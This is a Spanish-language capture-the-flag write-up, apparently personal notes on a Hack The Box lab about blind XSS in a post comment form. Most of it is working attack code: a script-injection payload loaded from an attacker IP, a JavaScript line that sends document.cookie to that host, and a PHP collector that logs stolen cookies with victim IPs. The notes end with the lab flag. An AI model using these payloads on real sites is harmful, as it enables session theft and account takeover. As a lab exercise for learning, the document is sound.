Navegamos hasta el primer Post donde se nos muestran los siguientes campos
![[Pasted image 20250128225822.png]]
Probamos todos los campos menos el de email (requiere un email valido, por lo que significa que el email es comprobado en el backend, y no es vulnerable a XSS) con el siguiente codigo

"><script src="http://10.10.14.193:8080/{campo a probar}"></script>

![[Pasted image 20250128230014.png]]

lo que nos muestra que el script se ejecuta correctamente en el campo website(a la hora de probar i forgot to cambiar la extension en el campo web jasdjsadj), vamos a proceder a reutilizar el script del apartado 8

**Script.js**

``` javascript

document.location='http://10.10.14.193:8080/index.php?c='+document.cookie;
new Image().src='http://10.10.14.193:8080/index.php?c='+document.cookie;
```

**index.php**

``` php

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

```

Ejecutamos en el campo username

`"><script src="http://10.10.14.193:8080/script.js"></script>`

![[Pasted image 20250128230530.png]]

observamos que el script se ha ejecutado correctamente, hacemos un cat a cookies.txt y vemos la  **flag=HTB{cr055_5173_5cr1p71n6_n1nj4}**